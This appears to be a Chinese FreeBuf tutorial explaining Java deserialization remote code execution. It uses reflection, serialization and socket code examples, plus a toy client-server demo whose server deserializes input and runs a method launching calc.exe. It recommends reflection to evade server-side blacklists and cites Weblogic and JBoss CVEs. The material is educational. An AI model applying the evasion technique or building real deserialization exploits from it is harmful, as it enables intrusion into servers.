**在这里我们对Java中反序列化问题引发的远程代码执行漏洞的原理进行介绍。为了简化说明,在不引入第3方库的前提下进行操作，希望能起到抛砖引玉的效果。**

主要有3个部分组成：

> Java的反省机制
>
> Java的序列化处理
>
> Java的远程代码执行

## Java的反射与代码执行

我们先看1个简单的例子，使用Java调用计算器程序：

    
    
    import java.io.IOException;
    
    import java.lang.Runtime;
    
    public class Test {
    
        public static void main(String[] args) {
            Runtime env = Runtime.getRuntime();
            String cmd = "calc.exe";
            try {
                env.exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    

我们从`java.lang`包中导入Runtime类，之后调用其getRuntime方法得到1个Runtime对象，该对象可以用于JVM虚拟机运行状态的处理。接着我们调用其exec方法，传入1个字符串作为参数。

此时，将启动本地计算机上的计算器程序。

下面我们通过Java的反省机制对上述的代码进行重写。通过Java的反省机制可以动态的调用代码，而逃过一些服务端黑名单的处理：

    
    
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    
    public class Test {
    
        public static void main(String[] args) {
            try {
                Class<?> cls = Class.forName("java.lang.Runtime");
                String cmd = "calc.exe";
                try {
                    Method getRuntime = cls.getMethod("getRuntime", new Class[] {});
                    Object runtime = getRuntime.invoke(null);
                    Method exec = cls.getMethod("exec", String.class);
                    exec.invoke(runtime, cmd);
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                } catch (SecurityException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (IllegalArgumentException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                }
            } catch (ClassNotFoundException e1) {
                e1.printStackTrace();
            }
        }
    }
    

上述代码看起来很繁琐,实际上并不是很难。首先，通过Class.forName传入1个字符串作为参数，其返回1个Class的实例。而其作用是根据对应的名称找到对应的类。

接着我们使用Class实例的getMethod方法获取对应类的getRuntime方法，由于该类没有参数，因此可以将其设置为null或使用匿名类来处理。

    
    
    Method getRuntime = cls.getMethod("getRuntime", new Class[] {});
    

之后通过得到的方法的实例的invoke方法调用对应的类方法，由于没有参数则传入null即可。同理，我们再获取到exec方法。

## Java序列化处理

对于Java中的序列化处理，对应的类需要实现Serializable接口，例如：

    
    
    import java.io.Serializable;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.IOException;
    
    public class Reader implements Serializable {
        private static final long serialVersionUID = 10L;
    
        private void readObject(ObjectInputStream stream) {
            System.out.println("foo...bar...");
        }
    
        public static byte[] serialize(Object obj) {
            //序列化对象
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ObjectOutputStream output = null;
            try {
                output = new ObjectOutputStream(out);
                output.writeObject(obj);
                output.flush();
                output.close();
    
            } catch (IOException e) {
                e.printStackTrace();
            }
            return out.toByteArray();
    
        }
    
        public static Object deserialize(byte[] bytes) {
            //反序列化处理
            ByteArrayInputStream in = new ByteArrayInputStream(bytes);
            ObjectInputStream input;
            Object obj = null;
            try {
                input = new ObjectInputStream(in);
                obj = input.readObject();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
            return obj;
    
        }
    
        public static void main(String[] args) {
            byte[] data = serialize(new Reader()); //对类自身进行序列化
            Object response = deserialize(data);
            System.out.println(response);
        }
    }
    

在这里我们重写了该类的readObject方法，用于读取对象用于测试。其中比较重要的2个函数是serialize和deserialize，分别用于序列化和反序列化处理。

其中，serialize方法需要传入1个对象作为参数，其输出结果为1个字节数组。在该类中，其中的对象输出流ObjectOutputStream主要用于ByteArrayOutputStream进行包装，之后使用其writeObject方法将对象写入进去，最后我们通过ByteArrayOutputStream实例的toByteArray方法得到字节数组。

而在deserialize方法中，需要传入1个字节数组，而返回值为1个Object对象。与之前的序列化serialize函数类似，此时我们使用ByteArrayInputStream接收字节数组，之后使用ObjectInputStream对ByteArrayInputStream进行包装，接着调用其readObject方法得到1个Object对象，并将其返回。

当我们运行该类时，将得到如下的结果：

    
    
    foo...bar...

## Java远程通信与传输

为了实现Java代码的远程传输及远程代码执行，我们可以借助RMI、RPC等方式。而在这里我们使用Socket进行服务端及客户端处理。

首先是服务器端，监听本地的8888端口，其代码为：

    
    
    import java.net.Socket;
    import java.io.IOException;
    import java.io.InputStream;
    import java.net.ServerSocket;
    public class Server {
    
        public static void main(String[] args) throws ClassNotFoundException {
            int port = 8888;
            try {
                ServerSocket server = new ServerSocket(port);
                System.out.println("Server is waiting for connect");
                Socket socket = server.accept();
                InputStream input = socket.getInputStream();
                byte[] bytes = new byte[1024];
                int length = 0;
                while((length=input.read(bytes))!=-1) {
                    String out = new String(bytes, 0, length, "UTF-8");
                    System.out.println(out);
                }
                input.close();
                socket.close();
                server.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    

我们通过传入1个端口来实例化ServerSocket类，此时得到1个服务器的socket，之后调用其accept方法接收客户端的请求。此时，得到了1个socket对象，而通过socket对象的getInputStream方法获取输入流，并指定1个长度为1024的字节数组。接着调用socket的read方法读取那么指定长度的字节序列，之后通过String构造器将字节数组转换为字符串并输出。这样我们就得到了客户端传输的内容。

而对于客户端器，其代码类似如下:

    
    
    import java.io.IOException;
    import java.net.Socket;
    import java.io.OutputStream;
    
    public class Client {
    
        public static void main(String[] args) {
            String host = "192.168.1.108";
            int port = 8888;
            try {
                Socket socket = new Socket(host, port);
                OutputStream output = socket.getOutputStream();
                String message = "Hello,Java Socket Server";
                output.write(message.getBytes("UTF-8"));
                output.close();
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    

在客户端，我们通过Socket对象传递要连接的IP地址和端口，之后通过socket对象的getOutputStream方法获取到输出流，用于往服务器端发送输出。由于这里只是演示，使用的是本地的主机IP。而在实际应用中，如果我们知道某个外网主机的IP及开放的端口，如果当前主机存在对应的漏洞，也是可以利用类似的方式来实现的。  

这里我们设置要传输的内容为UTF-8编码的字符串，俄日在输出流的write方法中通过字符串的getBytes指定其编码，从而将其转换为对应的字节数组进行发送。

正常情况下，我们运行服务器后再运行客户端，在服务器端可以得到如下输出：

    
    
    Server is waiting for connect
    Hello,Java Socket Server
    

## Java反序列化与远程代码执行

下面我们通过Java反序列化的问题来实现远程代码执行，为了实现远程代码执行，我们首先在Reader类中添加1个malicious方法，其代码为：

    
    
        ...
        public Object malicious() throws IOException {
            Runtime.getRuntime().exec("calc.exe");
            System.out.println("Hacked the Server...");
            return this;
        }
    

在该方法中我们使用之前的介绍调用宿主机器上的计算器程序，然后输出1个相关信息，最后返回当前类。

之后是对服务器端的代码进行如下的修改：

    
    
    ...
    
    while((length=input.read(bytes))!=-1) {
        Reader obj = (Reader) Reader.deserialize(bytes);
        obj.malicious();
    }
    

我们在接收到客户端对应的字符串后对其进行反序列处理，之后调用某个指定的函数，从而实现远程代码的执行。

而在客户端，我们需要对其进行序列化处理：

    
    
    Reader reader = new Reader();
    byte[] bytes = Reader.serialize(reader);
    String message = new String(bytes);
    output.write(message.getBytes());
    

下面我们在宿主机器上运行服务器端程序，之后在本地机器上运行客户端程序，当客户端程序执行时，可以看到类似如下的结果：

![图片.png](https://image.3001.net/images/20190515/1557932041_5cdc2809d3f02.png!small)

可以看到，我们成功的在宿主机器上执行了对应的命令执行。

## 总结

为了实现通过Java的反序列问题来实现远程代码执行的漏洞，我们需要编写1个有恶意代码注入的序列化类。之后在客户端将恶意代码序列化后发送给服务器端，而服务器端需要调用我们期望的方法，从而触发远程代码执行。

为了避免服务器端进行一些安全处理，我们可以采用反射的方式来逃逸其处理。

这里只是1个简化的过程，更加实用的过程可以参考Apache Common
Collections的问题导致的Weblogic漏洞[CVE-2015-4852](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852)及Jboss的漏洞[CVE-2015-7501](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7501)。

 ***本文作者：yafeile，转载请注明来自FreeBuf.COM**

